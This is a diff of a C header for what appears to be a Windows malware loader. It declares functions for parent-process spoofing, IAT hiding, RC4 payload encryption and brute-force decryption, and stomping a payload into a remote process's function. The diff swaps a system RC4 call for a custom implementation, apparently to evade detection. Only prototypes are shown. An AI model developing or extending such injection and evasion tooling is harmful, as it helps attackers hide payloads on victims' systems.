@@ -9,6 +9,11 @@
 // Spoofer
 BOOL FindPPID(IN LPWSTR sProcessName, OUT HANDLE* hParent, OUT DWORD* dwProcessID);
 BOOL CreateSpoofedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread);
+typedef HANDLE(*f_CreateToolhelp32Snapshot)(DWORD, DWORD);
+typedef BOOL(*f_Process32First)(HANDLE, LPPROCESSENTRY32);
+typedef BOOL(*f_Process32Next)(HANDLE, LPPROCESSENTRY32);
+typedef HANDLE(*f_OpenProcess)(DWORD, BOOL, DWORD);
+
 
 // IAT utils
 FARPROC GetProcAddressReplacement(IN HMODULE hModule, IN LPCSTR lpApiName);
@@ -21,19 +26,18 @@ typedef BOOL(*f_VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
 typedef BOOL(*f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
 
 // RC4
+
 typedef struct
 {
-	DWORD	Length;
-	DWORD	MaximumLength;
-	PVOID	Buffer;
+	unsigned int i;
+	unsigned int j;
+	unsigned char s[256];
 
-} USTRING;
-typedef NTSTATUS(NTAPI* fnSystemFunction032)(
-	struct USTRING* Data,
-	struct USTRING* Key
-);
+} Rc4Context;
+
 BYTE BruteDecryption(IN BYTE bFirstByte, IN PBYTE pEncrypted, IN SIZE_T sEncrypted, OUT PBYTE* pDecrypted);
-BOOL RC4Encrypt(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);
+void rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
+void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);
 
 // Stomper
 PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize);
